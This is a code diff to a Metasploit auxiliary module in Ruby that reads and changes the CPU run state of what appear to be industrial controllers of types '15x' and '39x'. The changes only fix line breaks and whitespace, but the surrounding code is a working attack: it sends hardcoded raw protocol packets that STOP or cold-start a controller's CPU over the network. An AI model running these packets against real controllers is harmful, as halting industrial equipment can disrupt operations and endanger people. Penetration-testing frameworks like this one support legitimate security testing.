@@ -138,6 +138,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     state
   end
+
   def get_state2(data)
     if data[16..17] == '04'
       state = 'STOP'
@@ -149,6 +150,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     state
   end
+ 
   def get_cpu(rhost, rport, devicetype)
     connect(true, 'RHOST' => rhost, 'RPORT' => rport)
     state = 'unknown'
@@ -158,7 +160,8 @@ class MetasploitModule < Msf::Auxiliary
       send_recv_once("\x01\x00\x02\x00\x00\x00\x1c\x00\x03\x00\x03\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x07\x00\x05\x00\x06\x00\x08\x00\x10\x00\x02\x00\x11\x00\x0e\x00\x0f\x00\r\x00\x16@\x16\x00")
       ## Query packet
       data = send_recv_once("\x01\x00\x02\x00\x00\x00\x08\x00\x03\x00\x03\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x40\x0b\x40")
-      state = get_state1(data)    elsif devicetype == '39x'
+      state = get_state1(data)
+    elsif devicetype == '39x'
       init_phase2
       data = send_recv_once("\xcc\x01\x00\x0f@\x07\x00\x00\xea\xfa")
       state = get_state2(data)
@@ -168,7 +171,8 @@ class MetasploitModule < Msf::Auxiliary
     state
   end
 
-  def set_cpu(rhost, rport, action, state, devicetype)    connect(true, 'RHOST' => rhost, 'RPORT' => rport)
+  def set_cpu(rhost, rport, action, state, devicetype)
+    connect(true, 'RHOST' => rhost, 'RPORT' => rport)
     if devicetype == '15x'
       init_phase1 ## Several packets (21)
       send_recv_once("\x01\x00\x02\x00\x00\x00\x1c\x00\x03\x00\x03\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x07\x00\x05\x00\x06\x00\x08\x00\x10\x00\x02\x00\x11\x00\x0e\x00\x0f\x00\r\x00\x16@\x16\x00")
@@ -178,7 +182,8 @@ class MetasploitModule < Msf::Auxiliary
       else
         print_status('--> Sending STOP now')
         send_recv_once("\x01\x00\x02\x00\x00\x00\x00\x00\x01\x00\x07\x00\x00\x00\x00\x00")
-      end    elsif devicetype == '39x'
+      end
+    elsif devicetype == '39x'
       init_phase2 ## Several packets (6)
       if action == 'START' || (action == 'REV' && state == 'STOP')
         print_status('--> Sending COLD start now')
